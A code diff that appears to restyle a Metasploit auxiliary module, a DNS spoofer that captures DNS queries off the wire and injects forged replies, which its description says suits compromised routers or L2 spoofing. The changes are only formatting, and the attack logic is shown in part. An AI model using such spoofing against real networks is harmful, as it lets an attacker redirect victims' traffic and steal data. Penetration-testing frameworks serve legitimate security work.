@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Capture
@@ -11,28 +10,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DNS::Server
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Native DNS Spoofer (Example)',
-      'Description'    => %q{
-        This module provides a Rex based DNS service to resolve queries intercepted
-        via the capture mixin. Configure STATIC_ENTRIES to contain host-name mappings
-        desired for spoofing using a hostsfile or space/semicolon separated entries.
-        In default configuration, the service operates as a normal native DNS server
-        with the exception of consuming from and writing to the wire as opposed to a
-        listening socket. Best when compromising routers or spoofing L2 in order to
-        prevent return of the real reply which causes a race condition. The method
-        by which replies are filtered is up to the user (though iptables works fine).
-      },
-      'Author'         => 'RageLtMan <rageltman[at]sempervictus>',
-      'License'        => MSF_LICENSE,
-      'References'     => []
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Native DNS Spoofer (Example)',
+        'Description' => %q{
+          This module provides a Rex based DNS service to resolve queries intercepted
+          via the capture mixin. Configure STATIC_ENTRIES to contain host-name mappings
+          desired for spoofing using a hostsfile or space/semicolon separated entries.
+          In default configuration, the service operates as a normal native DNS server
+          with the exception of consuming from and writing to the wire as opposed to a
+          listening socket. Best when compromising routers or spoofing L2 in order to
+          prevent return of the real reply which causes a race condition. The method
+          by which replies are filtered is up to the user (though iptables works fine).
+        },
+        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
+        'License' => MSF_LICENSE,
+        'References' => []
+      )
+    )
 
     register_options(
       [
         OptString.new('FILTER', [false, 'The filter string for capturing traffic', 'dst port 53']),
         OptAddress.new('SRVHOST', [true, 'The local host to listen on for DNS services.', '127.0.2.2'])
-      ])
+      ]
+    )
 
     deregister_options('PCAPFILE')
   end
@@ -76,8 +79,8 @@ class MetasploitModule < Msf::Auxiliary
   #
   def capture_traffic
     check_pcaprub_loaded()
-    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround
-    open_pcap({'FILTER' => datastore['FILTER']})
+    ::Socket.do_not_reverse_lookup = true # Mac OS X workaround
+    open_pcap({ 'FILTER' => datastore['FILTER'] })
     @capture_thread = Rex::ThreadFactory.spawn("DNSSpoofer", false) do
       each_packet do |pack|
         begin
@@ -95,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Creates Proc to handle incoming requests
   #
-  def on_dispatch_request(cli,data)
+  def on_dispatch_request(cli, data)
     peer = "#{cli.ip_daddr}:" << (cli.is_udp? ? "#{cli.udp_dst}" : "#{cli.tcp_dst}")
     # Deal with non DNS traffic
     begin
@@ -139,18 +142,18 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Creates Proc to handle outbound responses
   #
-  def on_send_response(cli,data)
+  def on_send_response(cli, data)
     cli.payload = data
     cli.recalc
     inject cli.to_s
-    sent_info(cli,data) if datastore['VERBOSE']
+    sent_info(cli, data) if datastore['VERBOSE']
   end
 
   #
   # Prints information about spoofed packet after injection to reduce latency of operation
   # Shown to improve response time by >50% from ~1ms -> 0.3-0.4ms
   #
-  def sent_info(cli,data)
+  def sent_info(cli, data)
     net = Packet.encode_net(data)
     peer = "#{cli.ip_daddr}:" << (cli.is_udp? ? "#{cli.udp_dst}" : "#{cli.tcp_dst}")
     asked = net.question.map(&:qname).join(', ')
